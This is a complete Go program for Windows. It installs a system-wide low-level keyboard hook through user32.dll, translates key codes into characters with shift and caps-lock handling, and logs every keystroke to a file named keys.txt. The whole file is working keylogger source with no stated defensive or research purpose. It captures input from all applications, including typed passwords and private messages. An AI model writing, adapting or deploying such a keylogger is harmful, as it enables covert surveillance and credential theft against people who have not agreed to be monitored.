package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetKeyState         = user32.NewProc("GetKeyState")

	hook      HHOOK
	valueChan = make(chan string)
	vkodeChan = make(chan uint32)
)

var asciiMap = map[uint32]string{
	32:  " ",
	8:   " BSPACE ",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	13:  " Enter ",
	27:  " ESC ",
	160: " LSHIFT ",
	161: " RSHIFT ",
	20:  " CAPSLCK ",
	162: " LCTRL",
	163: " RCTRL ",
	165: " PAUSE ",
	166: " SCROLL ",
	167: " HOME ",
	91:  " WIN ",
	9:   " TAB ",
	190: ".",
	191: "/",
	188: ",",
	186: ";",
	222: "'",
	219: "[",
	221: "]",
	189: "-",
	187: "=",
	220: "\\",
}

type HHOOK uintptr
type WPARAM uintptr
type LPARAM uintptr
type LRESULT uintptr
type KBDLLHOOKSTRUCT struct {
	VkCode    uint32
	ScanCode  uint32
	Flags     uint32
	Time      uint32
	ExtraInfo uintptr
}

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	HC_ACTION      = 0
)

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd     syscall.Handle
	Message  uint32
	WParam   WPARAM
	LParam   LPARAM
	Time     uint32
	Pt       POINT
	LPrivate uint32
}

func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32) HHOOK {
	ret, _, _ := procSetWindowsHookExW.Call(uintptr(idHook), lpfn, hmod, uintptr(dwThreadId))
	return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam))
	return LRESULT(ret)
}

func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	if nCode == HC_ACTION {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		if wParam == WM_KEYDOWN {
			vkCode := kbdStruct.VkCode

			// Check for shift and caps lock states
			shiftPressed := (getKeyState(160)&0x8000) != 0 || (getKeyState(161)&0x8000) != 0
			capsLockOn := (getKeyState(20) & 0x0001) != 0
			value := asciiMap[vkCode]
			if shiftPressed || capsLockOn {
				value = transform(value, shiftPressed)
				valueChan <- value
				vkodeChan <- vkCode
			} else {
				value = transform(value, false)
				valueChan <- value
				vkodeChan <- vkCode
			}
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam)
}

func getKeyState(vkCode int) int {
	ret, _, _ := procGetKeyState.Call(uintptr(vkCode))
	return int(ret)
}

var symbolMap = map[byte]string{
	'`': "~", '1': "!", '2': "@", '3': "#", '4': "$", '5': "%",
	'6': "^", '7': "&", '8': "*", '9': "(", '0': ")", '-': "_",
	'=': "+", '[': "{", ']': "}", '\\': "|", ';': ":", '\'': "\"",
	',': "<", '.': ">", '/': "?",
}

func transform(s string, shift bool) string {
	if len(s) != 1 {
		return s
	}

	c := s[0]

	if c >= 'a' && c <= 'z' {
		if shift {
			return string(c - ('a' - 'A'))
		}
		return s
	}

	if c >= 'A' && c <= 'Z' {
		if shift {
			return s
		}
		return string(c + ('a' - 'A'))
	}

	if shift {
		if transformed, exists := symbolMap[c]; exists {
			return transformed
		}
	}

	return s
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
	return ret != 0
}

func main() {
	go func() {
		hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
		hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
		var msg MSG
		for {
			r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
			if r == 0 {
				break
			}
		}
	}()

	file, err := os.Create("keys.txt")
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	for {
		value := <-valueChan
		vkCode := <-vkodeChan
		fmt.Fprintf(file, "%s: %d\n", value, vkCode)
	}
}
